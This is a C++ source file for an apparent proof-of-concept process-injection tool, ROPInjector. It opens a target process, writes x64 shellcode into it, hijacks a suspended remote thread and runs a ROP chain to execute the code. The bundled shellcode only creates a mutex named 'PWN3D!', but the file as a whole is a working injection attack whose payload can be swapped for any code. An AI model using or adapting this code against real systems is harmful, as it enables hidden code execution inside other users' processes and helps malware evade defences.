// ROPInjector.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <Windows.h>
#include "ROPBuffer.h"
#include "ROPHelper.h"

int main(int argc, char* argv[])
{
	int RetVal = -1;

	BOOL UseRiteOfPassage = FALSE;

	DWORD ProcessId = 0;
	HANDLE ProcessHandle = NULL;
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY DynamicCodePolicy = { 0 };

	LPVOID RemoteShellcode = NULL;
	LPVOID RemoteShellcodeAddress = NULL;


	//0:  48 83 ec 28              sub    rsp, 0x28
	//4 : 48 83 e4 f0              and    rsp, 0xfffffffffffffff0
	//8 : 48 c7 c1 00 00 00 00     mov    rcx, 0x0					// LPSECURITY_ATTRIBUTES lpMutexAttributes,
	//f : 48 c7 c2 00 00 00 00     mov    rdx, 0x0					// BOOL                  bInitialOwner,
	//16 : 49 b8 12 12 12 12 12    movabs r8, 0x1212121212121212	// LPCSTR                lpName
	//1d : 12 12 12
	//20 : 48 b8 23 23 23 23 23    movabs rax, 0x2323232323232323	// kernel32!CreateMutexA
	//27 : 23 23 23
	//2a : ff d0                   call   rax
	//2c : 48 c7 c1 00 00 00 00    mov    rcx, 0x0					// DWORD dwExitCode
	//33 : 48 b8 34 34 34 34 34    movabs rax, 0x3434343434343434	// ntdll!RtlExitUserThread
	//3a : 34 34 34
	//3d : ff d0                   call   rax
	//3f : "PWN3D!\0"
	BYTE Shellcode[] = {
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x83, 0xE4, 0xF0,
		0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,
		0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,
		0x49, 0xB8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
		0x48, 0xB8, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,
		0xFF, 0xD0,
		0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,
		0x48, 0xB8, 0x34, 0x34, 0x34, 0x34, 0x34, 0x34, 0x34, 0x34,
		0xFF, 0xD0,
	    'P', 'W', 'N', '3', 'D', '!', 0x00};


	SIZE_T BytesWritten = 0;

	HANDLE ThreadHandle = NULL;
	DWORD ThreadId = 0;
	CONTEXT ThreadContext = { 0 };
	ThreadContext.ContextFlags = CONTEXT_ALL;

	if (2 > argc)
	{
		printf("Usage %s [ProcessId] [RiteOfPassage]\n", argv[0]);
		goto Leave;
	}
	if (3 == argc)
	{
		if (0 == _stricmp("RiteOfPassage", argv[2]))
			UseRiteOfPassage = TRUE;
	}

	ProcessId = atoi(argv[1]);
	printf("ROPInjector injecting %s ROP into process %i\n",
		(UseRiteOfPassage ? "RiteOfPassage" : "Normal"),
		ProcessId);

	printf("[+] Finding gadgets addresses\n");
	if (FALSE == FindFunctionAddresses())
		goto Leave;

	printf("[+] Enabling Debug privilege\n");
	EnableDebugPriv();


	printf("[+] Opening target process handle\n");
	ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	if (NULL == ProcessHandle)
		goto Leave;

	printf("[+] Verifying Dynamic Code Policy is disabled\n");
	if (FALSE == GetProcessMitigationPolicy(
		ProcessHandle,
		ProcessDynamicCodePolicy,
		&DynamicCodePolicy,
		sizeof(DynamicCodePolicy)))
		goto Leave;

	if (0x0 != DynamicCodePolicy.ProhibitDynamicCode)
	{
		printf("[+] Process has Dynamic Code Policy activated, cannot inject ROP!");
		goto Leave;
	}

	printf("[+] Allocating READ/WRITE memory for shellcode\n");
	RemoteShellcode = VirtualAllocEx(
		ProcessHandle,
		NULL,
		GetPageSize(),
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_READWRITE);

	if (NULL == RemoteShellcode)
		goto Leave;

	RemoteShellcodeAddress = (LPVOID)((ULONGLONG)RemoteShellcode + 0x100);

	*((ULONGLONG*)&Shellcode[0x18]) = (ULONGLONG)RemoteShellcodeAddress + 0x3F;
	*((ULONGLONG*)&Shellcode[0x22]) = CreateMutexAddress;
	*((ULONGLONG*)&Shellcode[0x35]) = RtlExitUserThreadAddress;

	printf("[+] Copying shellcode into target process\n");
	if (FALSE == WriteProcessMemory(ProcessHandle, RemoteShellcodeAddress, Shellcode, sizeof(Shellcode), &BytesWritten))
		goto Leave;

	if (sizeof(Shellcode) != BytesWritten)
		goto Leave;

	printf("[+] Creating new suspended thread on target process\n");
	ThreadHandle = CreateRemoteThread(
		ProcessHandle,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)RtlExitUserThreadAddress,
		NULL,
		CREATE_SUSPENDED,
		&ThreadId);

	if (NULL == ThreadHandle)
		goto Leave;

	printf("[+] Fetching new thread's context\n");
	if (FALSE == GetThreadContext(ThreadHandle, &ThreadContext))
		goto Leave;

	printf("[+] Building ROP\n");


	// Define a scope for ROPBuffer variable to make sure it is properly disposed
	{
		ROPBuffer Rop(ThreadContext.Rsp - 0x100, 0x20);

		if (UseRiteOfPassage)
			BuildRiteOfPassageRop(&Rop, (ULONGLONG)RemoteShellcode, (ULONGLONG)RemoteShellcodeAddress);
		else
			BuildSimpleRop(&Rop, (ULONGLONG)RemoteShellcode, (ULONGLONG)RemoteShellcodeAddress);

		ThreadContext.Rip = Rop.GetRip();
		ThreadContext.Rsp = Rop.GetRsp();

		BytesWritten = 0;
		printf("[+] Writing ROP into target stack\n");
		if (FALSE == WriteProcessMemory(ProcessHandle, (LPVOID)ThreadContext.Rsp, Rop.GetBuffer(), Rop.GetBufferSize(), &BytesWritten))
			goto Leave;
	}


	printf("[+] Setting thread's context to first gadget\n");
	if (FALSE == SetThreadContext(ThreadHandle, &ThreadContext))
		goto Leave;

	printf("[+] Resuming thread's execution\n");
	if (FALSE == ResumeThread(ThreadHandle))
		goto Leave;
	printf("[+] Done!\n");

	RetVal = 0;
Leave:
	if (0 != RetVal)
	{
		printf("ERROR (GetLastError() = 0x%X)\n", GetLastError());
		if (NULL != ThreadHandle)
		{
			TerminateThread(ThreadHandle, 0);
		}
		if (NULL != RemoteShellcode)
		{
			VirtualFreeEx(ProcessHandle, RemoteShellcode, 0, MEM_RELEASE);
		}
	}
	if (NULL != ThreadHandle)
		CloseHandle(ThreadHandle);
	if (NULL != ProcessHandle)
		CloseHandle(ProcessHandle);

    return RetVal;
}

